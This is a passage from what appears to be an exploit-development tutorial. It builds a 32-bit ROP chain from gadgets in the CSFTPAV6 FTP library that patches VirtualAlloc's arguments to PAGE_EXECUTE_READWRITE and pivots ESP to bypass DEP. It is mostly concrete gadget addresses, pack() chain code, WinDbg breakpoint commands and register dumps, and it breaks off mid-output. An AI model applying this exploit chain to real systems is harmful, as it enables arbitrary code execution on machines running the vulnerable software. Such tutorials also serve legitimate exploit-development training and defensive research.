+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret
+</span></span></code></pre></div><p>Additionally, since lpAddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from EAX.
+In the previous example, we used the somewhat arbitrary value of -0x210 to align EAX to our shellcode. Since we increased ESI by 4, we need to use -0x20C or 0xfffffdf4 this time, as shown in the updated ROP chain below.
+We will reproduce the ROP chain to copy ESI value into EAX and then substract EAX 0x20c:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax, esi ; pop esi ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5052f773</span>)) <span style="color:#960050;background-color:#1e0010">#</span> push eax ; pop esi ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xfffffdf4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x20c</span>  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50533bf4</span>)) <span style="color:#960050;background-color:#1e0010">#</span> sub eax, ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
+</span></span></code></pre></div><p>It is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.</p>
+<p>Now if we run the code, and inspect lpAddress and the return address, they should point to the same dummy address. Once we know the real offset from the shellcode, we will fix the offset and they should point to the shellcode address.</p>
+<h2 id="patching-dwsize">Patching dwSize</h2>
+<p>Now we are going to move to dwSize, which we can set to 0x01, since VirtualAlloc will apply the new protections on the entire memory page.
+The issue is that the value is really a DWORD (0x00000001), so it will contain null bytes. We can&rsquo;t perform a mov or an inc instruction, so we need to use another technique.
+The new technique that we will use is the <code>neg</code> instruction. This instruction will replace the value in a register for its two&rsquo;s complement. This is equivalent to substract the value from zero.
+In 32 bits we can abuse the fact that we can perform this operation and ignore the upper DWORD of the result to obtain the value we want.</p>
+<p>For example, if we want to obtain 0x00000001, we can substract ffffffff from 0 and take the lower DWORD:</p>
+<pre tabindex="0"><code>0:006&gt; ? 0 - ffffffff
+Evaluate expression: -4294967295 = ffffffff`00000001
+</code></pre><p>Stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower DWORD. Note that this is not valid per se in x64 and we would have to truncate the register (as the ffffffff value would exist after the calculation).
+Therefore, if we want to obtain a 0x01 value, we can just negate fffffffff from a register.
+<strong>Note: In 32 bits, we can use neg (compliment of two) of any value to obtain the same value but in positive, in the case that the value has null bytes.</strong>*</p>
+<p>Once again, we must point to the dwSize variable in the stack to modify it. And once again, this variable is 4 bytes higher than ESI. So we can increment ESI by four again and then pop the value 0xffffffff into eax and negate it. Lastly, we can override the value that dwSize has for this value in EAX, which is 0x01.</p>
+<h2 id="patching-flallocationtype">Patching flAllocationType</h2>
+<p>Now we must move to flAllocationType, which must be set to 0x1000.
+We could try to reuse the trick of negation but we notice that two’s complement to 0x1000 is 0xfffff000, which also contains null bytes, so we keep having the problems:</p>
+<pre tabindex="0"><code>0:063&gt; ? 0 - 1000
+Evaluate expression: -4096 = fffff000
+</code></pre><p>While it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively. We’re going to use the existing gadgets we found, which will allow us to pop arbitrary values into EAX and ECX and subsequently perform an addition of them.</p>
+<p>We want to have 0x1000 as our final value in any register.
+We can substract any value with non-null badchars from 0x1000 and we can take the DWORD of the result and add it to the value we have chosen. This results in our 0x1000 value again, but we replace 0x1000 for these two values, the one we have chosen and the DWORD of the result, to obtain our desired value.
+Let&rsquo;s see it graphically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">80808080</span>
+</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">2155901056</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">7f7f8f</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">80808080</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7f7f8f</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">4294971392</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001000</span>
+</span></span></code></pre></div><p><strong>Note</strong>: Both values, the one chosen and its DWORD result from substraction, should not have badchars. It is recommended to choose long values.
+Now we need to update our ROP chain to pop 0x80808080 into EAX, pop 0x7f7f8f80 into ECX, and then add them together to obtain 0x1000 (due to the 32 bit truncation). Remember that to access flAllocationType dummy address we have to increment ESI by four again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5053a0f5</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x80808080</span>)) <span style="color:#960050;background-color:#1e0010">#</span> first value to be added  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x7f7f8f80</span>)) <span style="color:#960050;background-color:#1e0010">#</span> second value to be added  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
+</span></span></code></pre></div><p><strong>Note: due to the reuse of some gadgets, we can create conditional breakpoint to stop in a gadget but only if the value of the registers are the ones we want. For example, here stop in 0x505179a only if EAX is 0x80808080</strong>:</p>
+<pre tabindex="0"><code>bp 0x5051579a &#34;.if (@eax &amp; 0x0`ffffffff) = 0x80808080 {} .else {gc}&#34;
+</code></pre><h2 id="patching-flprotect">Patching flProtect</h2>
+<p>The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
+In order to write that to the stack, we will reuse the same technique we did for flAllocationType.
+As it has null bytes (0x00000040) we have to do the neg trick. Let&rsquo;s find out the value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">80808080</span>
+</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">2155905088</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">7f7f7f</span>c0
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">063</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">80808080</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7f7f7f</span>c0
+</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#ae81ff">4294967360</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000040</span>
+</span></span></code></pre></div><p>According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. This would be the ROP chain to patch flProtect, doing everything we have done for the other variables (EIP increment, setting up the operations and patching the value in the address):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50522fa7</span>)) <span style="color:#960050;background-color:#1e0010">#</span> inc esi ; add al, <span style="color:#ae81ff">0x2B</span> ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5053a0f5</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop eax ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x80808080</span>)) <span style="color:#960050;background-color:#1e0010">#</span> first value to be added  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x7f7f7fc0</span>)) <span style="color:#960050;background-color:#1e0010">#</span> second value to be added  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051cbb6</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov dword [esi], eax ; ret
+</span></span></code></pre></div><p><strong>Note: We have finished our full exploit with all the gadgets. A recommendation is to add the following gadget that will make a software breakpoint, in order to execute the entire ROP chain and catch the execution flow jut after the flProtect value has been patched:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051e4db</span>)) <span style="color:#960050;background-color:#1e0010">#</span> int3 ; push eax ; call esi
+</span></span></code></pre></div><p>Note that only int3 will be executed, the other instructions will get paused. Remember to remove it after inspecting that everything works:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
+</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">16</span>b0<span style="color:#ae81ff">.4</span>c0)<span style="color:#f92672">:</span> Break instruction exception <span style="color:#f92672">-</span> code <span style="color:#ae81ff">80000003</span> (first chance)
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000040</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05</span>aebf60 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">7f7f7f</span>c0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77292</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">0184e304</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5051e4</span>db esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0184e40</span>c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">!</span>FtpUploadFileW<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd63d</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5051e4</span>db cc              <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">055</span><span style="color:#f92672">&gt;</span> dds esi <span style="color:#f92672">-</span> <span style="color:#ae81ff">14</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f0  <span style="color:#ae81ff">76</span>c05680 KERNEL32<span style="color:#f92672">!</span>VirtualAllocStub
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f4  <span style="color:#ae81ff">0184e504</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>f8  <span style="color:#ae81ff">0184e504</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e2</span>fc  <span style="color:#ae81ff">00000001</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e300</span>  <span style="color:#ae81ff">00001000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0184e304</span>  <span style="color:#ae81ff">00000040</span>
+</span></span></code></pre></div><p>As we can see in ESI and lower locations the prepared call stack for the VirtualAlloc function has been prepared. We have the correct address for VirtualAlloc, the return address, and the four parameters: lpAddress, dwSize, flAllocationType and lpProtect.</p>
+<h1 id="fixing-esp-to-execute-virtualalloc">Fixing ESP to execute VirtualAlloc</h1>
+<p>The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
+In order to invoke the API, we must jump to the &ldquo;VirtualAlloc&rdquo; address in the stack.
+How do we jump? By forcing ESP to point to such address and then performing a ret instruction (ret single gadget).
+In order to force ESP to point to such address, we must perform a ROP chain to move ESP here:</p>
+<pre tabindex="0"><code>0:055&gt; dds esi - 14
+0184e2f0  76c05680 KERNEL32!VirtualAllocStub &lt;- ESP SHOULD POINT HERE
+0184e2f4  0184e504
+0184e2f8  0184e504
+0184e2fc  00000001
+0184e300  00001000
+0184e304  00000040
+</code></pre><p><strong>Note that the return address and lpAddress do not point to our shellcode yet. We need to fix these values later. Let&rsquo;s focus on the ROP chain needed to ESP to point to this address.</strong></p>
+<p>Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET.
+However, this is only useful is EBP previously points to our VirtualAlloc address in the stack.
+Let&rsquo;s force EBP to point to our VirtualAlloc address.</p>
+<p>First, we must remember that when the ROP chain has been finished patching the arguments of VirtualAlloc, ESI will contain the address of the last parameter (flProtect). We can use this address and substract the bytes from this address to the address of VirtualAlloc in the stack.
+Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.
+<strong>Note: If you have to add a value to another one, in 32 bits you can abuse the fact that adding a large value will overflow. Sometimes adding a large value is the same as adding a small value (with badchars). Only 32 bits.</strong></p>
+<p>Therefore, what we will do is:</p>
+<ul>
+<li>Use EIP that is near our desired address.</li>
+<li>Move EIP to EAX</li>
+<li>Substract some bytes to EAX to reach our desired address in the stack (<strong>Note</strong>: we do this in EAX as there are more gadgets with EAX).</li>
+<li>Move EAX to EBX</li>
+<li>Move EBX to ESP</li>
+</ul>
+<p>We have to move EAX to EBX and then EBX to ESP as there are not direct gadgets. Therefore, we have to play a bit with the registers.</p>
+<p>The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.</p>
+<p>The gadget chain to move ESP to our desired address is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e"># Put ESP to point to VirtualAlloc address in stack.  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># In order to set ESP, we need gadgets that operate with ESI, EAX, ECX, EBP and finally ESP.  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># There are not direct pop esp gadgets or similar.  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5050118e</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov eax,esi ; pop esi ; retn  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x42424242</span>)) <span style="color:#960050;background-color:#1e0010">#</span> junk  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x505115a3</span>)) <span style="color:#960050;background-color:#1e0010">#</span> pop ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0xffffffe8</span>)) <span style="color:#960050;background-color:#1e0010">#</span> negative offset value  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051579a</span>)) <span style="color:#960050;background-color:#1e0010">#</span> add eax, ecx ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x5051571f</span>)) <span style="color:#960050;background-color:#1e0010">#</span> xchg eax, ebp ; ret  
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">+=</span> <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, (<span style="color:#ae81ff">0x50533cbf</span>)) <span style="color:#960050;background-color:#1e0010">#</span> mov esp, ebp ; pop ebp ; ret
+</span></span></code></pre></div><p>Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes (same as substracting 0x18 bytes).
+Note that we put ESP <strong>before the VirtualAlloc address as we end doing a POP EBP gadget</strong>.
+<strong>Note: In this case we reused a value that was in the stack so we pointed EBP 4 bytes higher and we made a pop instruction so ESP is decremented and EBP takes such value. We cant do the strategy of putting other value as the next in the gadget chain as we are doing a mov esp, which means that esp is not going to point anymore to our rop gadget! remember that moving ESP means that we lose control of our gadgets. So we have to do the offset-4</strong></p>
+<p>Now, we can put a breakpoint on any of the latest gadgets we added.
+<strong>Note: as the gadget has been used several times, and we know EAX value is 0x40 after patching flProtect, we can set a conditional breakpoint to stop on that gadget address if EAX is 0x40:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>bp <span style="color:#ae81ff">0x5050118e</span> <span style="color:#e6db74">&#34;.if @eax = 0x40 {} .else {gc}&#34;</span>
+</span></span></code></pre></div><p>We can see that we stop just after patching flProtect:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> g
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000040</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">05e4</span>b220 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">7f7f7f</span>c0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>ce304 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">5050118</span>e esp<span style="color:#f92672">=</span><span style="color:#ae81ff">00f</span>ce40c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
+</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000203</span>
+</span></span><span style="display:flex;"><span>CSFTPAV6<span style="color:#f92672">+</span><span style="color:#ae81ff">0x118e</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5050118</span>e <span style="color:#ae81ff">8</span>bc6            mov     eax,esi
+</span></span></code></pre></div><p>Let&rsquo;s execute the ROP chain and see where ESP points to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> p
+</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">51515151</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">066</span><span style="color:#ae81ff">8</span>b1c8 ecx<span style="color:#f92672">=</span>ffffffe8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77182</span>da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">42424242</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">50533</span>cbf esp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce424 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">026</span>ce2ec iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po cy
